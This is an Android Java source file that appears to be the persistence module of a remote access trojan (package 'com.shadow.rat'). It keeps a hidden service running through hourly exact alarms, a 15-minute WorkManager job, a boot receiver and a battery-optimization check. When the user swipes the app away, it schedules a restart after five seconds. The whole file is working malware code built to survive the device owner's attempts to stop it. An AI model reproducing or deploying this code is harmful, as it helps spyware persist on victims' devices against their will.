package com.shadow.rat.persistence;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import com.shadow.rat.core.ShadowForegroundService;
import com.shadow.rat.utils.Logger;
import java.util.concurrent.TimeUnit;

public class PersistenceManager {
    private static final String TAG = "PersistenceManager";
    private final Context context;
    private final ConfigManager configManager;
    private final AlarmManager alarmManager;
    
    public PersistenceManager(Context context, ConfigManager configManager) {
        this.context = context;
        this.configManager = configManager;
        this.alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
    }
    
    public void setupSurvival() {
        setupAlarm();
        setupWorkManager();
        setupBootReceiver();
        requestBatteryOptimization();
    }
    
    private void setupAlarm() {
        try {
            Intent intent = new Intent(context, ShadowForegroundService.class);
            intent.setAction("RESTART_SERVICE");
            PendingIntent pendingIntent = PendingIntent.getService(
                context, 0, intent, 
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );
            
            long interval = AlarmManager.INTERVAL_HOUR;
            long triggerTime = System.currentTimeMillis() + interval;
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, 
                    triggerTime, pendingIntent);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
            } else {
                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
            }
            
            Logger.d(TAG, "Alarm setup for service restart");
            
        } catch (Exception e) {
            Logger.e(TAG, "Failed to setup alarm", e);
        }
    }
    
    private void setupWorkManager() {
        try {
            // Periodic work every 15 minutes
            PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(
                ServiceStarterWorker.class,
                15, TimeUnit.MINUTES
            ).addTag("shadow_service_survival").build();
            
            WorkManager.getInstance(context).enqueue(workRequest);
            
            Logger.d(TAG, "WorkManager setup for service survival");
            
        } catch (Exception e) {
            Logger.e(TAG, "Failed to setup WorkManager", e);
        }
    }
    
    private void setupBootReceiver() {
        // Already handled by BootReceiver in manifest
        Logger.d(TAG, "Boot receiver setup complete");
    }
    
    private void requestBatteryOptimization() {
        // Android 6+ battery optimization exemption
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.os.PowerManager pm = (android.os.PowerManager) 
                    context.getSystemService(Context.POWER_SERVICE);
                if (!pm.isIgnoringBatteryOptimizations(context.getPackageName())) {
                    Logger.d(TAG, "Requesting battery optimization exemption");
                    // User must approve this
                }
            }
        } catch (Exception e) {
            Logger.e(TAG, "Battery optimization request failed", e);
        }
    }
    
    public void onTaskRemoved() {
        // Called when user swipes away the app
        // Restart service after a delay
        scheduleServiceRestart(5000);
    }
    
    private void scheduleServiceRestart(long delayMs) {
        try {
            Intent intent = new Intent(context, ShadowForegroundService.class);
            PendingIntent pendingIntent = PendingIntent.getService(
                context, 1, intent, 
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );
            
            alarmManager.set(AlarmManager.RTC_WAKEUP, 
                System.currentTimeMillis() + delayMs, pendingIntent);
            
            Logger.d(TAG, "Service restart scheduled in " + delayMs + "ms");
            
        } catch (Exception e) {
            Logger.e(TAG, "Failed to schedule service restart", e);
        }
    }
}